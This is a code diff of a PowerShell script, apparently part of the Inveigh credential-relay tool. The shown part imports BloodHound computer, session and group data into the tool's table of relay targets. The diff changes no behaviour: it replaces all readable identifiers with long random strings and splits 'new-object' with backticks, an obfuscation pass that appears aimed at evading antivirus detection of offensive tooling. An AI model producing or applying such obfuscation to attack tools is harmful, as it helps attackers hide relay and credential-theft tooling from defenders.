+                    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] DNS lookup for $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp failed"
                 }
 
             }
 
-            if(!$MarketAsk)
+            if(!$FqCXmCIIgzNuUJwCJqTmH)
             {
 
-                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
+                for($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$vfvDllDKJdYKKWFSzYEB++)
                 {
 
-                    if(($OrderSteam -and $LightOval.enumerate[$ColorReply].Hostname -eq $OrderSteam) -or ($SmashDolls -and $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls))
+                    if(($eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname -eq $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp) -or ($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].IP -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS))
                     {
 
-                        if($LightOval.enumerate[$ColorReply].Hostname -ne $OrderSteam -and $LightOval.enumerate[$ColorReply].IP -eq $SmashDolls)
+                        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname -ne $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].IP -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                         {
 
-                            for($WindyEarth = 0;$WindyEarth -lt $LightOval.enumerate.Count;$WindyEarth++)
+                            for($BzFGkMlyRCBJPIhnmBAAarEIcObHct = 0;$BzFGkMlyRCBJPIhnmBAAarEIcObHct -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$BzFGkMlyRCBJPIhnmBAAarEIcObHct++)
                             {
 
-                                if($LightOval.enumerate[$WindyEarth].IP -eq $DogSuffer)
+                                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$BzFGkMlyRCBJPIhnmBAAarEIcObHct].IP -eq $bzuYBTesgpMTCghYjbbiqbRdMpLYlXcC)
                                 {
-                                    $SuperRigid = $WindyEarth
+                                    $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $BzFGkMlyRCBJPIhnmBAAarEIcObHct
                                     break
                                 }
 
                             }
 
-                            $LightOval.enumerate[$SuperRigid].Hostname = $OrderSteam
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx].Hostname = $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
                         }
                         else
                         {
 
-                            for($WindyEarth = 0;$WindyEarth -lt $LightOval.enumerate.Count;$WindyEarth++)
+                            for($BzFGkMlyRCBJPIhnmBAAarEIcObHct = 0;$BzFGkMlyRCBJPIhnmBAAarEIcObHct -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$BzFGkMlyRCBJPIhnmBAAarEIcObHct++)
                             {
 
-                                if($LightOval.enumerate[$WindyEarth].Hostname -eq $OrderSteam)
+                                if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$BzFGkMlyRCBJPIhnmBAAarEIcObHct].Hostname -eq $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp)
                                 {
-                                    $SuperRigid = $WindyEarth
+                                    $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $BzFGkMlyRCBJPIhnmBAAarEIcObHct
                                     break
                                 }
 
@@ -6661,12 +6661,12 @@ function ConvertTo-LightOval
 
                         }
 
-                        $LightOval.enumerate[$SuperRigid]."Administrator Users" = $SmashFull
-                        $LightOval.enumerate[$SuperRigid]."Administrator Groups" = $ShirtFilm
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx]."Administrator Users" = $bQiDvuwdgctjJSZZbBoYm
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx]."Administrator Groups" = $ldNsSjGWhCgchwzehfEBBYyuiOcOoeZZaXWzWpkaIKmbv
                     }
                     else
                     {
-                        $LightOval.enumerate.Add((New-RelayEnumObject -OrderSteam $_.Name -SmashDolls $SmashDolls -ItchyDusty $SmashFull -FryHarbor $ShirtFilm)) > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Add((New-RelayEnumObject -eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp $_.Name -vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl $bQiDvuwdgctjJSZZbBoYm -kZcyxyMFZEBSRHzWZjWFgLJXVOMmU $ldNsSjGWhCgchwzehfEBBYyuiOcOoeZZaXWzWpkaIKmbv)) > $null
                     }
 
                 }
@@ -6674,73 +6674,73 @@ function ConvertTo-LightOval
             }
             else
             {
-                $LightOval.enumerate.Add((New-RelayEnumObject -OrderSteam $_.Name -SmashDolls $SmashDolls -ItchyDusty $SmashFull -FryHarbor $ShirtFilm)) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Add((New-RelayEnumObject -eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp $_.Name -vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl $bQiDvuwdgctjJSZZbBoYm -kZcyxyMFZEBSRHzWZjWFgLJXVOMmU $ldNsSjGWhCgchwzehfEBBYyuiOcOoeZZaXWzWpkaIKmbv)) > $null
             }
 
-            $SmashDolls = $null
-            $OrderSteam = $null
-            $SmashFull = $null
-            $ShirtFilm = $null
-            $SuperRigid = $null
-            $ColorReply++
+            $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = $null
+            $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp = $null
+            $bQiDvuwdgctjJSZZbBoYm = $null
+            $ldNsSjGWhCgchwzehfEBBYyuiOcOoeZZaXWzWpkaIKmbv = $null
+            $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $null
+            $vfvDllDKJdYKKWFSzYEB++
         }
 
-        Write-TableSteam "[+] Import completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
-        $SonEgg.Reset()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Import completed in $([Math]::Truncate($TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Elapsed.TotalSeconds)) seconds"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Reset()
         Remove-Variable bloodhound_computers
     }
 
-    if($RainyShave)
+    if($JRPFnfKvazFOZaFuyEmuboVRJBxuGr)
     {
-        $RainyShave = (Resolve-Path $RainyShave).Path
-        $FetchPump = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
-        $FetchPump.MaxJsonLength = 104857600
-        $BurnRhythm = [System.IO.File]::ReadAllText($RainyShave)
-        $BurnRhythm = $FetchPump.DeserializeObject($BurnRhythm)
-        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
-        Write-TableSteam "[*] Parsing BloodHound Sessions JSON"
-        $BurnRhythm = Invoke-ParseItem $BurnRhythm
-        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
-        $SonEgg.Reset()
-        $SonEgg.Start()
-        Write-TableSteam "[*] Importing sessions to Inveigh"
-        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
-        $ColorReply = 0
+        $JRPFnfKvazFOZaFuyEmuboVRJBxuGr = (Resolve-Path $JRPFnfKvazFOZaFuyEmuboVRJBxuGr).Path
+        $MAJJgqmNDWekMaMuZjRyunxvHmrKjMmYPsReZWBsbgh = ne`w`-`ob`je`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $MAJJgqmNDWekMaMuZjRyunxvHmrKjMmYPsReZWBsbgh.MaxJsonLength = 104857600
+        $oPHYEwWWbQnJIntkWLCEEwFm = [System.IO.File]::ReadAllText($JRPFnfKvazFOZaFuyEmuboVRJBxuGr)
+        $oPHYEwWWbQnJIntkWLCEEwFm = $MAJJgqmNDWekMaMuZjRyunxvHmrKjMmYPsReZWBsbgh.DeserializeObject($oPHYEwWWbQnJIntkWLCEEwFm)
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr = [System.Diagnostics.Stopwatch]::StartNew()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Parsing BloodHound Sessions JSON"
+        $oPHYEwWWbQnJIntkWLCEEwFm = Invoke-ParseItem $oPHYEwWWbQnJIntkWLCEEwFm
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Parsing completed in $([Math]::Truncate($TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Elapsed.TotalSeconds)) seconds"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Reset()
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Start()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Importing sessions to Inveigh"
+        $FgqRGcuqYWZvHYaiqeNInanha = [System.Diagnostics.Stopwatch]::StartNew()
+        $vfvDllDKJdYKKWFSzYEB = 0
 
-        if(!$BurnRhythm.Sessions)
+        if(!$oPHYEwWWbQnJIntkWLCEEwFm.Sessions)
         {
-            Write-TableSteam "[!] JSON sessions parse failed"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[!] JSON sessions parse failed"
             throw
         }
 
-        $BurnRhythm.Sessions | ForEach-Object {
+        $oPHYEwWWbQnJIntkWLCEEwFm.Sessions | ForEach-Object {
             
-            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
+            if($FgqRGcuqYWZvHYaiqeNInanha.Elapsed.TotalMilliseconds -ge 500)
             {
-                $PetiteSail = [Math]::Truncate($ColorReply / $BurnRhythm.Sessions.Count * 100)
+                $bzVBwsIbqiLBMByfMyANsyy = [Math]::Truncate($vfvDllDKJdYKKWFSzYEB / $oPHYEwWWbQnJIntkWLCEEwFm.Sessions.Count * 100)
 
-                if($PetiteSail -le 100)
+                if($bzVBwsIbqiLBMByfMyANsyy -le 100)
                 {
-                    Write-Progress -Activity "[*] Importing sessions" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
+                    Write-Progress -Activity "[*] Importing sessions" -Status "$bzVBwsIbqiLBMByfMyANsyy% Complete:" -PercentComplete $bzVBwsIbqiLBMByfMyANsyy -ErrorAction SilentlyContinue
                 }
 
-                $SuddenIcicle.Reset()
-                $SuddenIcicle.Start()
+                $FgqRGcuqYWZvHYaiqeNInanha.Reset()
+                $FgqRGcuqYWZvHYaiqeNInanha.Start()
             }
 
-            $OrderSteam = $_.ComputerName
+            $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp = $_.ComputerName
 
-            if($OrderSteam -as [IPAddress] -as [Bool])
+            if($eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp -as [IPAddress] -as [Bool])
             {
-                $SmashDolls = $OrderSteam
-                $OrderSteam = $null
+                $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
+                $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp = $null
 
-                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
+                for($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$vfvDllDKJdYKKWFSzYEB++)
                 {
 
-                    if($LightOval.enumerate[$ColorReply].IP -eq $DogSuffer)
+                    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].IP -eq $bzuYBTesgpMTCghYjbbiqbRdMpLYlXcC)
                     {
-                        $SuperRigid = $ColorReply
+                        $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $vfvDllDKJdYKKWFSzYEB
                         break
                     }
 
@@ -6749,103 +6749,103 @@ function ConvertTo-LightOval
             }
             else
             {
-                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
+                for($vfvDllDKJdYKKWFSzYEB = 0;$vfvDllDKJdYKKWFSzYEB -lt $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count;$vfvDllDKJdYKKWFSzYEB++)
                 {
 
-                    if($LightOval.enumerate[$ColorReply].Hostname -eq $OrderSteam)
+                    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$vfvDllDKJdYKKWFSzYEB].Hostname -eq $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp)
                     {
-                        $SuperRigid = $ColorReply
+                        $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $vfvDllDKJdYKKWFSzYEB
                         break
                     }
 
                 }
 
-                if($HomelyShow)
+                if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL)
                 {
-                    $SmashDolls = Get-DNSEntry $OrderSteam
+                    $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = Get-DNSEntry $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
 
-                    if(!$SmashDolls)
+                    if(!$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                     {
-                        Write-TableSteam "[-] DNS lookup for $OrderSteam failed or IPv6 address"
+                        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] DNS lookup for $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp failed or IPv6 address"
                     }
 
                 }
 
             }
 
-            if(!$MarketAsk -or $SuperRigid -ge 0)
+            if(!$FqCXmCIIgzNuUJwCJqTmH -or $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx -ge 0)
             {
-                [Array]$SmallRoyal = $LightOval.enumerate[$SuperRigid].Sessions
+                [Array]$eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx].Sessions
 
-                if($SmallRoyal -notcontains $_.UserName)
+                if($eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw -notcontains $_.UserName)
                 {
-                    $SmallRoyal += $_.UserName
-                    $LightOval.enumerate[$SuperRigid].Sessions = $SmallRoyal
+                    $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw += $_.UserName
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate[$PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx].Sessions = $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw
                 }
 
             }
             else
             {   
-                $LightOval.enumerate.Add($(New-RelayEnumObject -OrderSteam $OrderSteam -SmashDolls $SmashDolls -RainyShave $_.UserName)) > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Add($(New-RelayEnumObject -eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp -vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS -JRPFnfKvazFOZaFuyEmuboVRJBxuGr $_.UserName)) > $null
             }
 
-            $OrderSteam = $null
-            $SmashDolls = $null
-            $SmallRoyal = $null
-            $SuperRigid = $null
-            $ColorReply++
+            $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp = $null
+            $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS = $null
+            $eiGtHTDNvfEdvCsCSuvHTCQxBBUBnulKBNwcxw = $null
+            $PyLvgcFDMbdgmgwWIstwEqhjQofsgrvvWavRILddNjx = $null
+            $vfvDllDKJdYKKWFSzYEB++
         }
 
-        Write-TableSteam "[+] Import completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
-        $SonEgg.Reset()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Import completed in $([Math]::Truncate($TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Elapsed.TotalSeconds)) seconds"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Reset()
         Remove-Variable bloodhound_sessions
     }
     
-    if($RoughGate)
+    if($AVUNSSWtBzyEwbWvxRjMGOZYBlz)
     {
-        $RoughGate = (Resolve-Path $RoughGate).Path
-        $DaffyLaugh = ne`w-`obje`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
-        $DaffyLaugh.MaxJsonLength = 104857600
-        $HomeLight = [System.IO.File]::ReadAllText($RoughGate)
-        $HomeLight = $DaffyLaugh.DeserializeObject($HomeLight)
-        $SonEgg = [System.Diagnostics.Stopwatch]::StartNew()
-        Write-TableSteam "[*] Parsing BloodHound Groups JSON"
-        $HomeLight = Invoke-ParseItem $HomeLight
-        Write-TableSteam "[+] Parsing completed in $([Math]::Truncate($SonEgg.Elapsed.TotalSeconds)) seconds"
-        $SonEgg.Reset()
-        $SonEgg.Start()
-        Write-TableSteam "[*] Importing groups to Inveigh"
-        $SuddenIcicle = [System.Diagnostics.Stopwatch]::StartNew()
-        $ColorReply = 0
+        $AVUNSSWtBzyEwbWvxRjMGOZYBlz = (Resolve-Path $AVUNSSWtBzyEwbWvxRjMGOZYBlz).Path
+        $SqmDVpGveADEKxVIKnnGfUHyNnwOwW = ne`w`-`ob`je`ct -TypeName System.Web.Script.Serialization.JavaScriptSerializer
+        $SqmDVpGveADEKxVIKnnGfUHyNnwOwW.MaxJsonLength = 104857600
+        $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS = [System.IO.File]::ReadAllText($AVUNSSWtBzyEwbWvxRjMGOZYBlz)
+        $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS = $SqmDVpGveADEKxVIKnnGfUHyNnwOwW.DeserializeObject($IyFZiLPMnmAUbJIXHesvITRppGMcsTYS)
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr = [System.Diagnostics.Stopwatch]::StartNew()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Parsing BloodHound Groups JSON"
+        $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS = Invoke-ParseItem $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Parsing completed in $([Math]::Truncate($TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Elapsed.TotalSeconds)) seconds"
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Reset()
+        $TxHoTRfTSHiUPZUsuKUPkBakLCUoVphlPdJMxQMiTZcFr.Start()
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[*] Importing groups to Inveigh"
+        $FgqRGcuqYWZvHYaiqeNInanha = [System.Diagnostics.Stopwatch]::StartNew()
+        $vfvDllDKJdYKKWFSzYEB = 0
 
-        if(!$HomeLight.Groups)
+        if(!$IyFZiLPMnmAUbJIXHesvITRppGMcsTYS.Groups)
         {
-            Write-TableSteam "[!] JSON groups parse failed"
+            Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[!] JSON groups parse failed"
             throw
         }
         
-        $HomeLight.Groups | ForEach-Object {
+        $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS.Groups | ForEach-Object {
 
-            if($SuddenIcicle.Elapsed.TotalMilliseconds -ge 500)
+            if($FgqRGcuqYWZvHYaiqeNInanha.Elapsed.TotalMilliseconds -ge 500)
             {
-                $PetiteSail = [Math]::Truncate($ColorReply / $HomeLight.Groups.Count * 100)
+                $bzVBwsIbqiLBMByfMyANsyy = [Math]::Truncate($vfvDllDKJdYKKWFSzYEB / $IyFZiLPMnmAUbJIXHesvITRppGMcsTYS.Groups.Count * 100)
 
-                if($PetiteSail -le 100)
+                if($bzVBwsIbqiLBMByfMyANsyy -le 100)
                 {
-                    Write-Progress -Activity "[*] Importing groups" -Status "$PetiteSail% Complete:" -PercentComplete $PetiteSail -ErrorAction SilentlyContinue
+                    Write-Progress -Activity "[*] Importing groups" -Status "$bzVBwsIbqiLBMByfMyANsyy% Complete:" -PercentComplete $bzVBwsIbqiLBMByfMyANsyy -ErrorAction SilentlyContinue
                 }
 
-                $SuddenIcicle.Reset()
-                $SuddenIcicle.Start()
+                $FgqRGcuqYWZvHYaiqeNInanha.Reset()
+                $FgqRGcuqYWZvHYaiqeNInanha.Start()
             }
 
-            [Array]$FriendOffend = $_.Members | Select-Object -expand MemberName
-            $LightOval.group_table.Add($_.Name,$FriendOffend)
-            $FriendOffend = $null
-            $ColorReply++
+            [Array]$vgSYrKKhzquFpaEdyfptGdcdNSgXCtjpWrOvEJL = $_.Members | Select-Object -expand MemberName
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.group_table.Add($_.Name,$vgSYrKKhzquFpaEdyfptGdcdNSgXCtjpWrOvEJL)
+            $vgSYrKKhzquFpaEdyfptGdcdNSgXCtjpWrOvEJL = $null
+            $vfvDllDKJdYKKWFSzYEB++
         }
 
-        Write-TableSteam "[+] Import completed in $([Math]::Truncate($FastenTrick.Elapsed.TotalSeconds)) seconds"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[+] Import completed in $([Math]::Truncate($lIlxrbMaiaJlJYBZlfyRzNXMBzMGE.Elapsed.TotalSeconds)) seconds"
     }
 
 }
